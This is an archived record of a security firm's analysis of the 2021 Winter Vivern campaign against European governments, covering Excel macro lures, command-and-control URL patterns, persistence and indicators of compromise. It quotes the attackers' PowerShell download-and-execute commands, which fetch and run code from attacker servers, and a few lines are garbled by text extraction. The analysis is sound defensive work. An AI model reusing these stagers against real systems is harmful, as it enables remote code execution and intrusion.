{
    "id": "8f990d80-bbeb-43ea-8ef2-a1bcdd0173bb",
    "created_at": "2023-01-12T14:59:05.616083Z",
    "updated_at": "2025-03-27T02:16:17.360075Z",
    "deleted_at": null,
    "sha1_hash": "4c78935186b2fb7157a529166d6e1bb94ad83792",
    "title": "2021-09-28 - Winter Vivern – all Summer",
    "authors": "",
    "file_creation_date": "2022-05-28T23:35:27Z",
    "file_modification_date": "2022-05-28T23:35:27Z",
    "file_size": 642839,
    "plain_text": "# Winter Vivern – all Summer\n\n**lab52.io/blog/winter-vivern-all-summer/**\n\nIn July, 2021, Lab52 found a currently active infection campaign (domain still up at the time of this writing) attributed to a group referred as\n[Wintervivern after a report published by the research team from DomainTools.](https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs)\n\nAs the starting point for this research, we recently noticed that unless properly obfuscated, some functions in XLM macro could show their\narguments in the strings of the excel file containing the macros.\n\nWe decided to take some advantage from this fact, and we tried to hunt for interesting excel files until we found a set of excel documents that\nrevealed an active campaign against European governments, and without attribution so far.\n\nWe first caught a generic powershell line in a XLM macro, which caught our attention along with other keywords:\n\n_powershell.exe -c iex((new-object net.webclient).DownloadString(‘https://server/run.txt’))_\n\nAdditionally, the yara ruleset created by John Lambert (@JohnLaTwC) indicated that the XML macro contained in this document was\npotentially created using SharpShooter (gen_Excel4Macro_Sharpshooter) which could be a useful fact in order to track the activity of the\nactors behind these documents.\n\nAs stated before, we also found in this same document other very interesting strings that would give an idea about the document’s content,\nalong with some email addresses. Some of this strings were the following:\n\n_External Relations Committee_\n_Working Party on Short-Term Economic Prospects_\n_Governing Board of the Development Centre_\n_Global Forum on Public Governance_\n\nFurthermore, this document contained embedded the following URL, many times:\n\nhxxps://securetourspd.]com/syncService/sync.php?v=3ac2cc6263f84836a7cb38d04f1094b6907527c3e0265dd0dc480b0ba1204e51\n\n\n-----\n\nte a qu c be a o a a a ys s o t e docu e t, e ou d out t at t e a o e e t o ed co a d ou d se e t e o o g e co a ds\nusing a user-agent filter only serving requests coming from the MS Excel user-agent.\n\nThis new set of commands would first download from the same domain a XML file and use it to establish a scheduled task for persistence, with\nname “Server_Update_Synchronization-{SDFGEYH-9D36-4HB1-8BWD-0EC1BD4FNM131}”, which would execute the following commands\nafter Logon:\n\npowershell.exe -w hidden -c “start-process ‘powershell.exe’ -win hidden -argumentlist {\n_$g=New-Object Net.Webclient;_\n_$g.credentials=[net.credentialcache]::DefaultNetworkCredentials;_\n_iex_\n_g.DownloadString(‘https://securetourspd.com/../users/2cd6c84c6c64ec05e7b418e15f9d1b7c0dc6733154aa266c64f0cb74e2083472/ceec36e_\n\nAfter establishing the persistence, it implements a function which happens to be a minimal RAT which is called every 10 seconds and receives\na command from C2, executes it, and sends the result back to the C2.\n\nThe contacted domain was registered on July 1st pointing to 185.238.]169.57 associated to the ISP “IROKO Networks Corporation/Scalaxy\nB.V. Researching about this domain, we found that VirusTotal showed some interesting full URLs, being one of them, the one we already found\nin the starting document.\n\n\n-----\n\nt as a so te est g t e act t at t e U co ta g s /do oad e as actua y de ed Goog e\n\nWe could also reach some of those downloaded XLS files from the domain, and observed that these documents did not contain any\nfunctionality or suspicious strings.\n\nHowever, after reviewing these documents and the URLs, we noticed that the documents and the domains contained as part of the path in the\nURL were directly related to different government institutions from different countries:\n\nsds.va –> Segreteria di Stato – Vaticano – Secretariat of State\nlrp.lt –> Lietuvos Respublikos Prezidentas – Lithuania – President of the Republic of Lithuania\nmzv.sk –> Ministerstvo zahraničných vecí – Slovakia – Ministry of Foreign Affairs\n\nAt this point, now we could identify an interesting pattern in the different URLs found that allowed us to divide the C2 contacts in three different\nURLs for different functionalities.\n\n1. https:// [C2 domain]/[target domain]/excel_files_service/downloadFile.php?v=[some victim ID]\n2. https:// [C2 domain]/syncService/sync.php?v=[some victim ID]\n3. https:// [C2 domain]/../users/[some victim ID]/[some file ID].php’\n4. https:// [C2 domain]/xml_file.xml\n\nURL #1 would just download the XLS file with no macros, which could indicate that this could be used to serve clean files as a decoy.\n\nURL #2 would be found in XLS files with XLM macros and it could be the first contact with the C2 after the infection. This would trigger the next\nstages of the infection since it would download and execute the previously documented commands and install the persistence as a scheduled\ntask.\n\nURL #3 would be found within the scheduled task and it would also download the same commands than URL #2 but without the lines to\nestablish the scheduled task. Also, and most importantly, this URL structure would also be used for the C2 communication for command\nexecution using a different [file ID] for command requests or sending command results.\n\nURL #4 would download the xml file used for the scheduled task.\n\nWe tried to pull the thread of this URL structures but after some unsuccessful research we had to go back to the execution details, and we\nfinally ended up finding something while searching by the name of the scheduled task.\n\nWith the help of Google dorking, we found a new XLS document with excel4 macros uploaded to the public sandbox of any.run:\n\nΕνημερωμένος κατάλογος_NS.xls fdc4631008461df18e78fb653662f111\n\nOn the other hand, using the same information we also found in VTi two .txt files named serverHttpRequest(RUN).txt which would be\ndownloaded by different samples:\n\n6661ea544a541357ada6c32eb70cd96c\n7a59366676daaa95cc71a0110ef75753\n\n\n-----\n\nThe two .txt files resulted to be the same powershell content executed by the first download of the malicious XLS file with slight differences,\nand the xls file from any.run also resulted to follow the same techniques. In fact, it seems like the excel file would download one of those two\nfiles since it would contact the following URL, whose domain was also found in the .txt files:\n\nhxxps://secure-daddy.]com/wintervivern/server/serverHttpRequest(RUN).txt’\n\nAt this point, we could relate this new campaign with another recent campaign from a May 2021 named “Winter Vivern” due to the path from\n[URL and described by the research team of DomainTools.](https://www.domaintools.com/resources/blog/winter-vivern-a-look-at-re-crafted-government-maldocs)\n\nOne important thing to note, as DomainTools also stated, is the fact that all the information contained in the different XLS document seems to\nbe public, which means that this documents were carefully crafted to target very specific entities.\n\nThanks to this new discovery, we obtained a new set of similar malicious XLS with the same excel4 macros, using different domains, which\nincreased the list of targeted countries while still aiming to government institutions.\n\nIf we compare the full URLs used in both campaigns we could relate them as equivalent, resulting in:\n\n1. No equivalent URL\n2. https:// [C2 domain]/wintervivern/server/serverHttpRequest(RUN).txt’\n3.\n\n1. https:// [C2 domain /wintervivern/vivern/getAnswer.php?username=$uname’\n2. https:// [C2 domain] /wintervivern/vivern/getcommand?username=$uname\n4.\n\n1. https:// [C2 domain]/vivern/test_old.xml\n2. https:// [C2 domain]/vivern/test.xml\n\nThe slight differences found in the analogy of URLs is actually revealing very interesting information about the evolution of this threat actor.\n\nFirst, we did not find a path serving clean files that we assumed they could be used as a decoy. Secondly, we find a single common URL for all\nXLS files, instead of containing victim identifiers. Due to the lack of victim identifiers, we would find more generic URLs for the reception of\ncommands and delivery of results, where only the username of the infected computer would be reported to the C2. Lastly, we find two different\nversions of the xml document served for the scheduled task, both containing “test” as a name. This could be intentional so as not to raise\nalarms on the victim, but it is clear that there has been a small evolution in some details of the TTPs of this actor, which is currently active.\n\n**Indicators of Compromise:**\n\n37.252.]9.123\n\n37.252.5.]133\n\n185.238.]169.57\n\nsecuretourspd[.]com\n\nsecure-daddy[.]com\n\ncentr-security[.]com\n\nsecuremanag[.]com\n\n\n-----\n\nmloncar@seidco.]net\n\n94f45ba55420961451afd1b70657375ec64b7697a515a37842478a5009694cfa\n\n2a176721b35543d7f4d9e3d24a7c50e0ea57d7eaa251c6b24985d5266a6a977a\n\nf84044bddbd3e05fac1319c988919492971553bb65dbf7b7988d66a8cd677eb8\n\nbd1efa4cf3f02cd8723c48deb5f69a432c22f359b93cab4f1d2a9f037a236eaa\n\n00f6291012646213a5aab81153490bb121bbf9c64bb62eb4ce582c3af88bccfd\n\n638bedcc00c1b1b8a25026b34c29cecc76c050aef56fa55f6e8878e6b951e473\n\nc34e98a31246f0903d4742dcf0a9890d5328ba8a1897fcf9cd803e104591ed5f\n\n4f498238ba3568fd9dc2d12954e16bdd06ddadd4484fa2b40c6f9cf08a2c1360\n\nd66b7443285a23cea3c21cdfeb7fbc22cac53f347437ff26b9d709279996744a\n\n0303936e7341b47b797b42b6911101d72a82f38faa263898c5993e7ee90107cc\n\n2a176721b35543d7f4d9e3d24a7c50e0ea57d7eaa251c6b24985d5266a6a977a\n\n066ac6b068ba1b3f177173a113085cc53c785e875b841948df8bbf095c61807d\n\n63005efc652557fad43118273e11f7b37e2d59db2d677e936cddab82fba30602\n\n2f52434696f98c9668a85f1af5dd4af2be729a7971f878ca9125731e27c63c50\n\nb5551ee3d24c53983670fca24e07f0b86ceb3adb7ac353d59fc98f481e5339ca\n\ncdca87c79b4c3c0ed4ffad2a7a64f267250d94ed9e9f8d931faad91cecb5a595\n\n0682e44d2e37f2f7b3f42fffa8366f4b20470ab54ece04da444f47efda1ac610\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-28 - Winter Vivern – all Summer.pdf"
    ],
    "report_names": [
        "2021-09-28 - Winter Vivern – all Summer.pdf"
    ],
    "threat_actors": [
        {
            "id": "23226bab-4c84-4c65-a8d1-7ac10c44b172",
            "created_at": "2023-04-27T02:04:45.463683Z",
            "updated_at": "2025-03-27T02:02:10.213835Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "TA473",
                "TAG-70",
                "UAC-0114",
                "UNC4907"
            ],
            "source_name": "ETDA:Winter Vivern",
            "tools": [
                "APERETIF"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e6704f3c-15d7-4e1d-b5a8-e33e7e9bd925",
            "created_at": "2023-11-04T02:00:07.660461Z",
            "updated_at": "2025-03-27T02:00:03.14916Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "UAC-0114",
                "TA473",
                "TAG-70",
                "TA-473"
            ],
            "source_name": "MISPGALAXY:Winter Vivern",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a13b5ca4-fb52-44a9-aa5a-595eca6789ed",
            "created_at": "2022-10-25T15:50:23.4331Z",
            "updated_at": "2025-03-27T02:00:55.46701Z",
            "deleted_at": null,
            "main_name": "Sharpshooter",
            "aliases": [
                "Sharpshooter"
            ],
            "source_name": "MITRE:Sharpshooter",
            "tools": [
                "Rising Sun"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "a20598c1-894c-4173-be6e-64a1ce9732bd",
            "created_at": "2024-11-01T02:00:52.652891Z",
            "updated_at": "2025-03-27T02:00:55.484584Z",
            "deleted_at": null,
            "main_name": "Winter Vivern",
            "aliases": [
                "Winter Vivern",
                "TA473",
                "UAC-0114"
            ],
            "source_name": "MITRE:Winter Vivern",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535545,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1653780927,
    "ts_modification_date": 1653780927,
    "files": {
        "pdf": "https://archive.orkl.eu/4c78935186b2fb7157a529166d6e1bb94ad83792.pdf",
        "text": "https://archive.orkl.eu/4c78935186b2fb7157a529166d6e1bb94ad83792.txt",
        "img": "https://archive.orkl.eu/4c78935186b2fb7157a529166d6e1bb94ad83792.jpg"
    }
}